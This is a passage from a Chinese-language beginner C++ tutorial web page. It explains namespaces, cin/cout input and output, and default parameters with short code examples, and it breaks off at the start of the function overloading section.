<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>【C&#43;&#43;入门基础】命名空间 | 缺省参数 | 函数重载 | 引用 | 内联函数 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【C&#43;&#43;入门基础】命名空间 | 缺省参数 | 函数重载 | 引用 | 内联函数</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-github-gist">
                    
                        
                    
                    <p><img src="https://images2.imgbox.com/6f/b6/BrDg31Bl_o.gif" alt="在这里插入图片描述"></p> 
<p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#C_7">什么是C++</a></li>
<li><a href="#C_18">C++的发展史</a></li>
<li><a href="#1_C_28">1. C++关键字</a></li>
<li><a href="#2__35">2. 命名空间</a></li>
<li>
<ul>
<li><a href="#__40">? 命名空间的定义</a></li>
<li><a href="#__102">? 命名空间的使用</a></li>
</ul>
  </li>
<li><a href="#3_C_202">3. C++的输入和输出</a></li>
<li><a href="#4__264">4. 缺省参数</a></li>
<li>
<ul>
<li><a href="#__267">? 缺省参数概念</a></li>
<li><a href="#__295">? 缺省参数分类</a></li>
<li><a href="#__344">? 注意事项</a></li>
</ul>
  </li>
<li><a href="#5__390">5. 函数重载</a></li>
<li>
<ul>
<li><a href="#__393">? 函数重载概念</a></li>
<li><a href="#__434">? 函数重载原理</a></li>
<li><a href="#_extern_C_457">? extern "C"</a></li>
</ul>
  </li>
<li><a href="#6__481">6. 引用</a></li>
<li>
<ul>
<li><a href="#__482">? 引用的概念</a></li>
<li><a href="#__512">? 引用的特性</a></li>
<li><a href="#__558">? 常引用</a></li>
<li><a href="#__589">? 使用场景</a></li>
<li><a href="#__645">? 传值、传引用效率比较</a></li>
<li><a href="#__702">? 值和引用的作为返回值类型的性能比较</a></li>
<li><a href="#__761">? 引用和指针的区别</a></li>
<li><a href="#__818">? 引用和指针的区别</a></li>
</ul>
  </li>
<li><a href="#7__838">7. 内联函数</a></li>
<li>
<ul>
<li><a href="#__843">? 内敛函数的概念</a></li>
<li><a href="#__894">? 内敛函数的特性</a></li>
</ul>
  </li>
<li><a href="#8_auto_927">8. auto关键字</a></li>
<li>
<ul>
<li><a href="#_auto_930">? auto简介</a></li>
<li><a href="#_auto_970">? auto的使用细则</a></li>
<li><a href="#_auto_1015">? auto不能推导的场景</a></li>
</ul>
  </li>
<li><a href="#9__for_1041">9. 基于范围的for循环</a></li>
<li>
<ul>
<li><a href="#_for_1044">? 范围for的语法</a></li>
<li><a href="#_for_1111">? 范围for的使用条件</a></li>
</ul>
  </li>
<li><a href="#10__nullptr_1131">10. 指针空值nullptr</a></li>
<li>
<ul>
<li><a href="#_C98_1134">? C++98中的指针空值</a></li>
<li><a href="#_C11_1192">? C++11中的指针空值</a></li>
</ul>
 </li>
</ul>
</div>
<p></p> 
<hr> 
<h1>
<a id="C_7"></a>什么是C++</h1> 
<p><strong>C</strong> 语言是结构化和模块化的语言，适合处理较小规模的程序。对于复杂的问题，规模较大的程序，需要高度<br> 的抽象和建模时，<strong>C</strong> 语言则不合适。</p> 
<p>为了解决软件危机， <strong>20</strong> 世纪 <strong>80</strong> 年代， 计算机界提出了 <strong>OOP</strong>（<strong>object oriented programming：面向对象</strong>）思想，支持面向对象的程序设计语言应运而生。</p> 
<p><strong>1982</strong> 年，<strong>Bjarne Stroustrup</strong> 博士在 <strong>C</strong> 语言的基础上引入并扩充了面向对象的概念，发明了一种新的程序语言。为了表达该语言与 <strong>C</strong> 语言的渊源关系，命名为 <strong>C++</strong>。</p> 
<blockquote> 
 <p>因此：<strong>C++</strong> 是基于 <strong>C</strong> 语言而产生的，它既可以进行 <strong>C</strong> 语言的过程化程序设计，又可以进行以抽象数据类型为特点的基于对象的程序设计，还可以进行面向对象的程序设计。</p> 
</blockquote> 
<h1>
<a id="C_18"></a>C++的发展史</h1> 
<p><strong>1979</strong> 年，贝尔实验室的本贾尼等人试图分析 <strong>unix</strong> 内核的时候，试图将内核模块化，于是在C语言的基础上进行扩展，增加了类的机制，完成了一个可以运行的预处理程序，称之为 <strong>C with classes</strong>。</p> 
<p>语言的发展就像是练功打怪升级一样，也是逐步递进，由浅入深的过程。</p> 
<p>我们先来看下 <strong>C++</strong> 的历史版本（<strong>如下图所示?</strong>）。<br> <img src="https://images2.imgbox.com/10/44/cyd35rIJ_o.png" alt="在这里插入图片描述"></p> 
<p>目前，<strong>C++</strong> 还在不断的向后发展中。</p> 
<h1>
<a id="1_C_28"></a>1. C++关键字</h1> 
<p><strong>C</strong> 语言有 <strong>32</strong> 个关键字，而 <strong>C++</strong> 有 <strong>63</strong> 个关键字（<strong>如下图所示?</strong>）。<br> <img src="https://images2.imgbox.com/74/80/M0A59fQE_o.png" alt="在这里插入图片描述"></p> 
<p>当然是不是看到很多眼熟的 “朋友” 呢？没错，下面圈起来的这些关键字，就是在 <strong>C</strong> 语言中出现的（<strong>如下图所示?</strong>）。<br> <img src="https://images2.imgbox.com/0c/68/QW08lJVw_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="2__35"></a>2. 命名空间</h1> 
<blockquote> 
 <p>在 <strong>C/C++</strong> 中，变量、函数和后面要学到的类都是大量存在的，这些变量、函数和类的名称将都存在于全局作用域中，可能会导致很多冲突。<br>  <br> 使用命名空间的目的是对标识符的名称进行本地化，以避免命名冲突或名字污染，<strong>namespace</strong> 关键字的出现就是针对这种问题的。</p> 
</blockquote> 
<h2>
<a id="__40"></a>? 命名空间的定义</h2> 
<p>定义命名空间，需要使用到 <strong>namespace</strong> 关键字，后面跟命名空间的名字，然后接一对<code>{ }</code> 即可，<code>{ }</code> 中即为命名空间的成员。</p> 
<p><strong>（1）命名空间的普通定义</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"> <span class="token comment">// 普通的命名空间</span>
<span class="token keyword">namespace</span> N1 <span class="token comment">// N1为命名空间的名称</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//  命名空间中的内容，既可以定义变量，也可以定义函数</span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>（2）命名空间的嵌套定义</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// 命名空间可以嵌套</span>
<span class="token keyword">namespace</span> N1 <span class="token comment">// 定义一个名为N1的命名空间</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span> b<span class="token punctuation">;</span>
	<span class="token keyword">namespace</span> N2 <span class="token comment">// 嵌套定义另一个名为N2的命名空间</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">int</span> c<span class="token punctuation">;</span>
		<span class="token keyword">int</span> d<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>（3）命名空间的相同定义</strong></p> 
<blockquote> 
 <p>同一个工程中允许存在多个相同名称的命名空间，编译器最后会合成同一个命名空间中。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-c"><span class="token comment">// 定义一个N1</span>
namespace N1
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 再定义一个N1</span>
namespace N1
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> <span class="token function">Mul</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> left <span class="token operator">*</span> right<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>注意：一个命名空间就定义了一个新的作用域，命名空间中的所有内容都局限于该命名空间中</p> 
</blockquote> 
<h2>
<a id="__102"></a>? 命名空间的使用</h2> 
<p>我们已经知道了如何定义命名空间，那么我们应该如何使用命名空间中的成员呢？</p> 
<p>命名空间的使用一共有三种方式，我们一起来看看吧！</p> 
<p><strong>（1）加命名空间名称及作用域限定符</strong></p> 
<blockquote> 
 <p>符号 <code>::</code> 在 <strong>C++</strong> 中叫做作用域限定符。<br>  <br> 我们通过 <code>命名空间名称::命名空间成员</code> 便可以访问到命名空间中相应的成员。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token comment">// 加命名空间名称及作用域限定符</span>
<span class="token keyword">namespace</span> N
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">float</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	N<span class="token double-colon punctuation">::</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 将命名空间中的成员a赋值为10</span>
	N<span class="token double-colon punctuation">::</span>b <span class="token operator">=</span> <span class="token number">5.55</span><span class="token punctuation">;</span> <span class="token comment">// 将成员b赋值为5.55</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%dn"</span><span class="token punctuation">,</span> N<span class="token double-colon punctuation">::</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印a</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2fn"</span><span class="token punctuation">,</span> N<span class="token double-colon punctuation">::</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印b</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/1c/5c/lxuzpq30_o.png" alt="在这里插入图片描述"></p> 
<p><strong>（2）使用 using 将命名空间中成员引入</strong></p> 
<blockquote> 
 <p>我们还可以通过 <code>using 命名空间名称::命名空间成员</code> 的方式将命名空间中指定的成员引入。<br>  <br> 这样语句之后的代码中就可以直接使用引入的成员变量了。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token comment">// 使用using将命名空间中的成员引入</span>
<span class="token keyword">namespace</span> N
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">float</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">using</span> N<span class="token double-colon punctuation">::</span>a<span class="token punctuation">;</span> <span class="token comment">// 将命名空间中的成员a引入</span>
<span class="token keyword">using</span> N<span class="token double-colon punctuation">::</span>b<span class="token punctuation">;</span> <span class="token comment">// 再将b引入</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 将命名空间中的成员a赋值为10</span>
	b <span class="token operator">=</span> <span class="token number">5.55</span><span class="token punctuation">;</span> <span class="token comment">// 将b赋值为5.55</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%dn"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印成员a</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2fn"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印成员b</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/81/22/VsRITzAO_o.png" alt="在这里插入图片描述"></p> 
<p><strong>（3）使用 using namespace 命名空间名称引入</strong></p> 
<blockquote> 
 <p>最后一种方式就是通 <code>using namespace 命名空间名称</code> 将命名空间中的全部成员引入。<br>  <br> 这样语句之后的代码中就可以直接使用该命名空间内的全部成员了。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token comment">// 使用 using namespace 命名空间名称引入</span>
<span class="token keyword">namespace</span> N
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">float</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> N<span class="token punctuation">;</span> <span class="token comment">// 将命名空间N的所有成员引入</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 将命名空间中的成员a赋值为10</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%dn"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印命名空间中的成员a</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/aa/ff/opjOqpws_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="3_C_202"></a>3. C++的输入和输出</h1> 
<p>在学习任何语言的时候，我们首先会向 <strong>世界问好</strong>！也就是会在屏幕上打印 <strong>hello world</strong>！</p> 
<p>那么用 <strong>C++</strong> 如何打印呢？很简单。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/5c/0e/8UVuuDxu_o.png" alt="在这里插入图片描述"></p> 
<p><strong>代码解释：</strong></p> 
<blockquote> 
 <p><strong>C</strong> 语言中的标准输入输出函数为：<strong>scanf</strong> 和 <strong>printf</strong>。<br>  <br> 而在 <strong>C++</strong> 中，<strong>cin</strong> 是标准输入（键盘），<strong>cout</strong> 标准输出（控制台）。<br>  <br> 当我们使用 <strong>cin</strong> 和 <strong>cout</strong> 时，需要包含头文件 <code>&lt;iostream&gt;</code> 以及 <strong>std</strong> 标准命名空间。</p> 
</blockquote> 
<p>我们在 <strong>C</strong> 语言中，输入输出数据时，需要加数据格式控制比如：整形为 <code>%d</code>，字符为 <code>%c</code>。</p> 
<p>而 <strong>C++</strong> 的输入输出更方便，不需增加数据格式控制。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a<span class="token punctuation">;</span>
	<span class="token keyword">float</span> b<span class="token punctuation">;</span>
	<span class="token keyword">char</span> c<span class="token punctuation">;</span>

	cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span> <span class="token comment">// 输入一个整型</span>
	cin <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">;</span> <span class="token comment">// 输入一个浮点型</span>
	cin <span class="token operator">&gt;&gt;</span> c<span class="token punctuation">;</span> <span class="token comment">// 输入一个字符型</span>

	cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 换行</span>

	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印整型a</span>
	cout <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印浮点型b</span>
	cout <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 打印字符型c</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/e7/26/H1P0kono_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>注：<strong>endl</strong> 表示 <strong>换行</strong>，相当于 <strong>C</strong> 语言中的 <strong>n</strong>。</p> 
</blockquote> 
<h1>
<a id="4__264"></a>4. 缺省参数</h1> 
<p>在 <strong>C</strong> 语言中，函数没有指定参数列表，默认可以接收任意多个参数，但在 <strong>C++</strong> 中，因为严格的参数类型检测，没有参数列表的函数，默认为 <strong>void</strong>，不接收任何参数。</p> 
<h2>
<a id="__267"></a>? 缺省参数概念</h2> 
<p>缺省参数是声明或定义函数时为函数的参数指定一个默认值。</p> 
<p>在调用该函数时，如果没有指定实参则采用该默认值，否则使用指定的实参。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 没有指定实参，使用参数的默认值（打印0）</span>

	<span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 指定了实参，使用指定的实参（打印10）</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/dd/1d/Q4PrjJMR_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>在第一个 <strong>Test</strong> 函数中，输出的结果是 <strong>0</strong>，第二个 <strong>Test</strong> 函数输出结果是 <strong>10</strong>。</p> 
</blockquote> 
<h2>
<a id="__295"></a>? 缺省参数分类</h2> 
<p>缺省参数是分为两类的，一类是 <strong>全缺省</strong>，一类是 <strong>半缺省</strong>。</p> 
<p><strong>（1）全缺省参数</strong></p> 
<blockquote> 
 <p>全缺省参数所有参数都有默认值，如果没有手动传参，那么编译器会使用默认参数列表中的参数。<br>  <br> 但是这里值得注意的是，如果传参的时候只传了部分参数，那么该值会被 <strong>从左至右</strong> 匹配。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/6a/fc/PAsAndT9_o.png" alt="在这里插入图片描述"></p> 
<p><strong>（2）半缺省参数</strong></p> 
<blockquote> 
 <p>半缺省参数，即函数的参数不全为缺省参数。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">Test1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token punctuation">,</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">Test2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>其中 <strong>Test 1</strong> 函数至少传一个参数，<strong>Test 2</strong> 函数至少传两个参数，函数才可以正常运行。</p> 
</blockquote> 
<h2>
<a id="__344"></a>? 注意事项</h2> 
<p><strong>（1）半缺省参数必须从右往左依次来给出，不能间隔着给。</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// 错误示例</span>
<span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>（2） 缺省参数不能在函数声明和定义中同时出现</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// Test.h（函数声明）</span>
<span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Test.c（函数定义）</span>
<span class="token keyword">void</span> <span class="token function">TestFunc</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>如果 <strong>声明</strong> 与 <strong>定义</strong> 位置同时出现，恰巧两个位置提供的值不同，那编译器就无法确定到底该用那个缺省值。</p> 
</blockquote> 
<p><strong>（3） 缺省值必须是常量或者全局变量</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token comment">// 正确示例</span>

<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span> <span class="token comment">//全局变量</span>
<span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">int</span> c <span class="token operator">=</span> x<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h1>
<a id="5__390"></a>5. 函数重载</h1> 
<p>自然语言中，一个词可以有多重含义，人们可以通过上下文来判断该词真实的含义，即该词被 <strong>重（chong）载</strong> 了。</p> 
<h2>
<a id="__393"></a>? 函数重载概念</h2> 
<p>函数重载是指 <strong>在同一作用域内，可以有一组具有相同函数名，不同参数列表的函数，这组函数被称为重载函数。</strong></p> 
